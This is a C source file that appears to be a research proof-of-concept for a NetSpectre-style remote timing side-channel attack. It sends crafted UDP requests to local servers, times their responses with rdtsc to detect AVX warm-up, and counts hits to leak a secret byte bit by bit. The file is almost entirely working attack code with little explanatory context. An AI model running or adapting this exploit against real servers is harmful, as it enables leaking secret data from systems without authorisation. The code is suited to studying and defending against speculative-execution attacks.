#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h> //inet_addr
#include <sched.h>
#include <time.h>
#include <stdlib.h>



#define MAX(X,Y) (((X) > (Y)) ? (X) : (Y))
#define MIN(X,Y) (((X) < (Y)) ? (X) : (Y))

#define AVX_FAIL 9000
#define ARR_SIZE 1024
#define RECV_SIZE 3

#define REP 100000

uint16_t counter_hit[10][8] = {0};
uint16_t counter_miss[10][8] = {0};

char recvline[RECV_SIZE];


uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

void attack_byte(int byte_nr,socklen_t slen,struct sockaddr_in restricted_socket,
  struct sockaddr_in free_socket,struct sockaddr_in flush_socket,
  int sockfd,int sockfd2,int flush_fd)
{
   unsigned int send_val = 0;
   int j = 0,k = 0;

   uint64_t start = 0, end = 0;      
    
   int ind = 0;
   int val = 8 * byte_nr;
   int counter = 0;
   uint64_t delta = 0, delta2 = 0;


   int byte=0,bit=0;

   for(int bit = 0;bit < 8;bit++)
    {
      //attack
        for(int j = 0;j<REP;j++)
        {
          if(j % 10000 == 0)
            printf("%d\n",j);
          
          for(int i = 0;i<15;i++)
          {
            send_val = htonl(0);
            sendto(sockfd2,&send_val,sizeof(send_val),0,(struct sockaddr *) &free_socket,slen);
            recvfrom(sockfd2,recvline,RECV_SIZE,0,(struct sockaddr *) &free_socket,&slen);
            send_val = htonl(8*0+2);
            sendto(sockfd2,&send_val,sizeof(send_val),0,(struct sockaddr *) &free_socket,slen);
            recvfrom(sockfd2,recvline,RECV_SIZE,0,(struct sockaddr *) &free_socket,&slen);
          }

          asm volatile("mfence");
          usleep(5);
          asm volatile("mfence");
          //warm up using additional instructions
          //see test.c to check how the warmup and cool down is on your CPU!!!
          for(int i = 0;i<5;i++)
          {
            send_val = htonl(0);
            sendto(sockfd2,&send_val,sizeof(send_val),0,(struct sockaddr *) &free_socket,slen);
            recvfrom(sockfd2,recvline,RECV_SIZE,0,(struct sockaddr *) &free_socket,&slen);
            send_val = htonl(8*byte_nr+bit);
            sendto(sockfd2,&send_val,sizeof(send_val),0,(struct sockaddr *) &free_socket,slen);
            recvfrom(sockfd2,recvline,RECV_SIZE,0,(struct sockaddr *) &free_socket,&slen);
          }

          //if its warmed up it will be faster
          send_val = htonl(1);
          sendto(sockfd2,&send_val, sizeof(send_val),0,(struct sockaddr *) &free_socket, slen);

          //only access
          start = rdtsc();
          recvfrom(sockfd2,recvline,RECV_SIZE,0,(struct sockaddr *) &free_socket,&slen);
          end = rdtsc();
          delta = end - start;
          //printf("%d\n",delta);

          if(delta <= AVX_FAIL)
          {
            counter_hit[byte_nr][(7-bit)]++;
          }
          //would recommend to plot the data to distinguish
          //the counter hit is in some cases not reliable enough
          //since AVX instructions shift sometimes!!!
          //printf("%d\n",delta);

          asm volatile("mfence");
          usleep(1000);
          asm volatile("mfence");
        }
    }
}

int main(int argc,char **argv)
{
    srand(time(NULL));
    int sockfd,sockfd2,flush_fd;
    struct sockaddr_in restricted_socket,free_socket,flush_socket;

    socklen_t slen=sizeof(restricted_socket);
 
    if((sockfd=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) == -1)
    {
      printf("Socket 1 connection failed\n");
      perror("socket");
    }


    if((sockfd2=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))== -1)
    {
      printf("Socket 2 connection failed\n");
    }

    if((flush_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
      printf("Socket 3 connection failed\n");
    }
    
      
    bzero(&flush_socket, sizeof(flush_socket));
    bzero(&restricted_socket, sizeof(restricted_socket));
    bzero(&free_socket, sizeof(free_socket));
    
    restricted_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    restricted_socket.sin_family=AF_INET;
    restricted_socket.sin_port=htons(5000);

    free_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    free_socket.sin_family=AF_INET;
    free_socket.sin_port=htons(6000);

    flush_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    flush_socket.sin_family=AF_INET;
    flush_socket.sin_port=htons(6001);
  

    for(int byte_nr = 4;byte_nr < 5;byte_nr++)
    {
      attack_byte(byte_nr,slen,restricted_socket,
      free_socket,flush_socket,
      sockfd,sockfd2,flush_fd);
    }

    int i=0,j=0;

    
    printf("Hits\n");
    for (i = 0; i < 10; i++)
    {
      for(j = 0; j < 8;j++)
      {
        printf("%d ",counter_hit[i][j]);
      }
      printf("\n");
    } 
   
  return 0;
}

